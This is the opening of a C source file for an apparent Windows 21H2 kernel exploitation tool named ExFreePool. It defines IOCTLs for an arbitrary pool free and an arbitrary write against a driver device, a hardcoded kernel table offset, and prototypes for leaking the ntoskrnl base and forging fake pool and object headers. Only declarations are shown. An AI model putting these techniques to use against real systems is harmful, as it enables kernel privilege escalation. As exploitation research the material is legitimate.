#include <Windows.h>
#include <stdio.h>

#include "nt_query_structs_21H2_x64.h"

#include "pool_enums.h"
#include "pool_main_structs_21H2_x64.h"
#include "pool_type_info_structs_21H2_x64.h"
#include "pool_heap_segment_structs_21H2_x64.h"

#include "type_index_table.h"

#define BANNER \
("    ______     ______               ____              __\n" \
"   / ____/  __/ ____/_______  ___  / __ \\____  ____  / /\n" \
"  / __/ | |/_/ /_  / ___/ _ \\/ _ \\/ /_/ / __ \\/ __ \\/ / \n" \
" / /____>  </ __/ / /  /  __/  __/ ____/ /_/ / /_/ / /  \n" \
"/_____/_/|_/_/   /_/   \\___/\\___/_/    \\____/\\____/_/   \n" \
"                                                        \n" \
)

#define DEVICE "\\\\.\\ExFreePoolPrimitive"
#define IOCTL_ARBITRARY_POOL_FREE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_ARBITRARY_WRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 1, METHOD_NEITHER, FILE_ANY_ACCESS)

#define HEAP_OBJECT_COUNT 16384

#define NT_OBTYPEINDEXTABLE_21H2_x64_OFFSET 0x0000000000CFCE80

#define POOL_TAG 0x44334D56

int main(int argc, char** argv);

long long leak_ntoskrnl_base();

void initialize_pool_header(PPOOL_HEADER input_pool_header);
void initialize_object_header_quota(POBJECT_HEADER_QUOTA_INFO input_object_header_quota);
void initialize_quad(PQUAD input_quad);
void initialize_ex_push_lock(PEX_PUSH_LOCK input_ex_push_lock);
void initialize_object_create_information(POBJECT_CREATE_INFORMATION input_object_create_information);
void initialize_object_header(POBJECT_HEADER input_object_header, PEX_PUSH_LOCK input_ex_push_lock, PVOID input_heap_allocation_address, PQUAD input_quad, POBJECT_CREATE_INFORMATION input_object_create_information);
void initialize_main_pool_structs(char* address, PPOOL_HEADER input_pool_header, POBJECT_HEADER_QUOTA_INFO input_object_header_quota, PEX_PUSH_LOCK input_push_lock, PQUAD input_quad, POBJECT_CREATE_INFORMATION input_object_create_information, POBJECT_HEADER input_object_header);

void initialize_unicode_string(PUNICODE_STRING input_unicode_string);
void initialize_object_type_initializer(POBJECT_TYPE_INITIALIZER input_object_type_initializer);
void initialize_object_type(POBJECT_TYPE input_object_type);
void initialize_type_info_structs(PUNICODE_STRING input_unicode_string, POBJECT_TYPE_INITIALIZER input_object_type_initializer, POBJECT_TYPE input_object_type);

void arbitrary_write(HANDLE h_driver, long long what, long long where);

int mark_pool_structs_executable(PPOOL_HEADER input_pool_header, POBJECT_HEADER_QUOTA_INFO input_object_header_quota, PEX_PUSH_LOCK input_push_lock, PQUAD input_quad, POBJECT_CREATE_INFORMATION input_object_create_information, POBJECT_HEADER input_object_header);
void build_pool_chunk(char* fake_pool_memory_page, POOL_HEADER pool_header, OBJECT_HEADER_QUOTA_INFO object_header_quota_info, OBJECT_HEADER object_header);